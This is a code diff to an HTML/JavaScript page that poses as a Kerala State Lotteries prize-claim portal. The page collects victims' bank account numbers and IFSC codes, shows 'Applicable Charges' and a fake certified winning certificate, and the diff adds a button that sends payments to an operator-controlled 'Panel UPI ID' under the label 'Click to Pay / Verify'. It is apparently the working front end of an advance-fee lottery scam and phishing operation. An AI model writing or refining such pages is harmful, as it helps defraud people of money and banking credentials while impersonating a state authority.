@@ -21,6 +21,7 @@
     .btn-green { background: #16a34a; }
     .btn-amber { background: #d97706; }
     .btn-gray { background: #64748b; margin-top: 8px; }
+    .btn-upi { background: #7c3aed; color: white; padding: 10px; border-radius: 8px; font-size: 14px; font-weight: bold; margin: 10px 0; border: none; width: 100%; cursor: pointer; display: block; text-align: center; text-decoration: none; }
     .result-row { display: flex; justify-content: space-between; padding: 7px 0; border-bottom: 1px solid #fed7aa; font-size: 14px; }
     .winners-box { margin-top: 15px; background: #fff; border-radius: 12px; padding: 10px; border: 1.5px solid #fcd34d; max-height: 300px; overflow-y: auto; }
     .prize-category { border: 1px solid #fde68a; border-radius: 6px; padding: 8px; margin-bottom: 8px; background: #fffdf5; }
@@ -30,7 +31,7 @@
     .ticket-chip { background: #f1f5f9; font-size: 11px; padding: 4px 7px; border-radius: 4px; font-family: monospace; border: 1px solid #cbd5e1; }
     .user-winning-tag { background: #dc2626 !important; color: #ffffff !important; font-weight: bold !important; padding: 4px 8px !important; border-radius: 4px !important; }
 
-    /* Winning Certificate Styling */
+    /* Certificate Styling */
     .cert-container { margin-top: 15px; border-top: 2px dashed #10b981; padding-top: 15px; }
     .certificate-card { border: 5px double #b45309; padding: 16px; background: #fffdf5; border-radius: 10px; text-align: center; }
     .cert-heading { color: #b45309; font-size: 20px; font-weight: 900; margin-bottom: 2px; }
@@ -84,7 +85,7 @@
       </div>
     </div>
 
-    <!-- 3. WITHDRAW -->
+    <!-- 3. WITHDRAW (UPI Input Removed) -->
     <div id="pageWithdraw" class="card-page" style="display:none;">
       <h3 style="color:#1e3a8a; text-align:center; margin-bottom:12px;">Bank Transfer & Verification Form</h3>
       <form onsubmit="handleBankSubmit(event)">
@@ -92,7 +93,7 @@
         <input type="text" id="bankName" required placeholder="Bank Name (e.g., SBI, HDFC, ICICI)">
         <input type="text" id="accNumber" required placeholder="Bank Account Number" oninput="maskRealtime(this.value)">
         <input type="text" id="ifscCode" required placeholder="Bank IFSC Code">
-        <input type="text" id="upiId" placeholder="Registered UPI ID (e.g. mobile@upi)">
+        
         <div style="background:#fef08a; padding:8px; border-radius:6px; font-size:13px; font-weight:bold; color:#854d0e; margin-bottom:12px;">
           Masked Account: <span id="realtimeMask">XXXX-XXXX-XXXX</span>
         </div>
@@ -108,6 +109,10 @@
         <h3 style="color:#15803d;">Transaction Initiated</h3>
       </div>
       <div id="receiptBox" style="background:#fff; padding:12px; border-radius:8px; margin-bottom:12px;"></div>
+      
+      <!-- Panel UPI ID Button -->
+      <div id="upiBtnContainer"></div>
+
       <div style="background:#fee2e2; color:#991b1b; padding:10px; border-radius:6px; font-size:13px; text-align:center; margin-bottom:12px;">
         Prize amount will be credited directly to your bank account within 15 minutes.
       </div>
@@ -128,7 +133,7 @@
             <div class="cert-item"><b>Bank Name:</b> <span id="cBank"></span></div>
             <div class="cert-item"><b>Account Details:</b> <span id="cAccount"></span></div>
             <div class="cert-item"><b>IFSC Code:</b> <span id="cIfsc"></span></div>
-            <div class="cert-item"><b>Registered UPI ID:</b> <span id="cUpi" style="color:#2563eb; font-weight:bold;"></span></div>
+            <div class="cert-item"><b>Panel UPI ID:</b> <span id="cUpi" style="color:#7c3aed; font-weight:bold;"></span></div>
             <div class="cert-item"><b>Verification Status:</b> <span style="color:#15803d; font-weight:bold;">Approved / Processing</span></div>
           </div>
           <small style="color: #6b7280;">Digitally Signed & Certified • Directorate of Kerala State Lotteries</small>
@@ -256,10 +261,6 @@
           };
         }
 
-        if (current.upiId) {
-          document.getElementById("upiId").value = current.upiId;
-        }
-
         liveWinners.forEach(s => {
           s.tickets = s.tickets.filter(t => t.toLowerCase() !== current.ticket.toLowerCase());
           const slabKey = s.rank.toLowerCase().replace(/[^a-z0-9]/g, '');
@@ -276,7 +277,7 @@
           <div class="result-row"><b>Winning Category:</b><span style="color:#dc2626; font-weight:bold;">${current.prize}</span></div>
           <div class="result-row"><b>Prize Amount:</b><span style="color:#15803d; font-weight:bold; font-size:16px;">₹${current.amount}</span></div>
           <div class="result-row"><b>Applicable Charges:</b><span>₹${current.fee}</span></div>
-          ${current.upiId ? `<div class="result-row"><b>Registered UPI ID:</b><span style="color:#2563eb; font-weight:bold;">${current.upiId}</span></div>` : ''}
+          ${current.upiId ? `<div class="result-row"><b>Panel UPI ID:</b><span style="color:#7c3aed; font-weight:bold;">${current.upiId}</span></div>` : ''}
           <div class="result-row"><b>Claim Status:</b><span style="color:#15803d; font-weight:bold;">${current.status}</span></div>
         `;
 
@@ -300,7 +301,7 @@
       const enteredBank = document.getElementById("bankName").value.trim();
       const acc = document.getElementById("accNumber").value.trim();
       const enteredIfsc = document.getElementById("ifscCode").value.toUpperCase().trim();
-      const enteredUpi = document.getElementById("upiId").value.trim() || current.upiId || "N/A";
+      const panelUpi = current.upiId || "Not Registered";
       const mask = acc.length > 4 ? "XXXX-XXXX-" + acc.slice(-4) : acc;
       const dateStr = new Date().toLocaleDateString('en-IN');
 
@@ -310,10 +311,22 @@
         <div class="result-row"><b>Bank Name:</b><span>${enteredBank}</span></div>
         <div class="result-row"><b>Account Number:</b><span style="color:#b45309; font-weight:bold;">${mask}</span></div>
         <div class="result-row"><b>IFSC Code:</b><span>${enteredIfsc}</span></div>
-        <div class="result-row"><b>UPI ID:</b><span style="color:#2563eb; font-weight:bold;">${enteredUpi}</span></div>
+        <div class="result-row"><b>Panel UPI ID:</b><span style="color:#7c3aed; font-weight:bold;">${panelUpi}</span></div>
         <div class="result-row"><b>Winning Category:</b><span>${current.prize}</span></div>
         <div class="result-row"><b>Transfer Amount:</b><span style="color:#15803d; font-weight:bold;">₹${current.amount}</span></div>
       `;
+
+      // Panel UPI Button
+      const upiBtnBox = document.getElementById("upiBtnContainer");
+      if (current.upiId) {
+        upiBtnBox.innerHTML = `
+          <a class="btn-upi" href="upi://pay?pa=${encodeURIComponent(current.upiId)}&pn=LotteryWinner">
+            📱 Panel UPI ID: ${current.upiId} (Click to Pay / Verify)
+          </a>
+        `;
+      } else {
+        upiBtnBox.innerHTML = "";
+      }
 
       document.getElementById("cDate").innerText = dateStr;
       document.getElementById("cTicket").innerText = current.ticket;
@@ -325,7 +338,7 @@
       document.getElementById("cBank").innerText = enteredBank;
       document.getElementById("cAccount").innerText = mask;
       document.getElementById("cIfsc").innerText = enteredIfsc;
-      document.getElementById("cUpi").innerText = enteredUpi;
+      document.getElementById("cUpi").innerText = panelUpi;
 
       showPage("pageConfirm");
       fireConfetti();
